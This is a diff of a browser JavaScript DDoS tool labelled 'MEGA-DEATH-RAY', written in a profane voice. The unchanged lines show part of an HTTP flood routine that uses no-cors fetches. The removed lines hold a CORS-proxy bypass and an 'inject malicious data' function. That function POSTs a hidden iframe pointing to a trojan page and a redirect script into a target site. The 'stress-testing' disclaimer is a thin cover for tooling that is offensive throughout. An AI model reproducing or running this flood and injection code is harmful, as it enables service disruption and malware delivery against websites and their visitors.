@@ -1,4 +1,4 @@
-// MEGA-DEATH-RAY DDoS TOOL - Noodles Inc. (v5.0)
+// MEGA-DEATH-RAY DDoS TOOL - Noodles Inc. (v6.0)
 // WARNING: This tool is designed for **EXTREME** stress-testing only. Unauthorized use is a felony, you fuckin' degenerate.
 // By using this, you agree to sell your soul and firstborn to Noodles Inc. We ain't responsible for your dumbass choices.
 // ALL activities are logged in high-definition, so don't get cute. We're watching you, bitch.
@@ -227,10 +227,6 @@ async function httpFlood(url, hexBytes) {
         const timeoutId = setTimeout(() => controller.abort(), 10000); // 10 second timeout
         let targetURL = url;
 
-        if (useCORSProxy) {
-            targetURL = 'https://cors-anywhere.herokuapp.com/' + url;
-        }
-
         let fetchOptions = {
             mode: 'no-cors', // Bypass CORS like a goddamn ninja.
             method: 'GET', // GET request – simple, effective, like a kick to the balls.
@@ -433,52 +429,6 @@ selfDestructButton.addEventListener('click', () => {
         // window.location.href = 'about:blank';
     } else {
         alert('Noodles Inc: Self-destruct sequence aborted. Good choice, you almost fucked up.');
-    }
-});
-
-// Malicious Data Injection Function
-function injectMaliciousData(url) {
-    try {
-        // Generate a random code
-        const randomCode = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
-        const maliciousData = `<h1>${randomCode}</h1><iframe src="https://totally-not-a-virus.com/trojan.html" style="display:none;"></iframe><script>window.location.href='${url}';</script>`;
-
-        fetch(url, {
-            method: 'POST',
-            mode: 'no-cors',
-            headers: {
-                'Content-Type': 'application/x-www-form-urlencoded'
-            },
-            body: `maliciousData=${encodeURIComponent(maliciousData)}`
-        }).then(response => {
-            console.log('Malicious data injected successfully.');
-            logAction(`Malicious data injected into ${url}`);
-        }).catch(error => {
-            console.error('Failed to inject malicious data:', error);
-            logAction(`Failed to inject malicious data into ${url}: ${error}`);
-        });
-    } catch (error) {
-        console.error('Error injecting malicious data:', error);
-        logAction(`Error injecting malicious data into ${url}: ${error}`);
-    }
-}
-
-// Event listener for data injection
-const injectDataButton = document.createElement('button');
-injectDataButton.textContent = 'INJECT MALICIOUS DATA';
-injectDataButton.style.backgroundColor = 'darkblue';
-injectDataButton.style.color = 'white';
-injectDataButton.style.padding = '10px';
-injectDataButton.style.margin = '10px';
-injectDataButton.style.border = '2px solid purple';
-document.body.appendChild(injectDataButton);
-
-injectDataButton.addEventListener('click', () => {
-    const targetUrl = targetUrlInput.value;
-    if (targetUrl) {
-        injectMaliciousData(targetUrl);
-    } else {
-        alert('Noodles Inc: Enter a target URL to inject malicious data, you dimwit!');
     }
 });
 
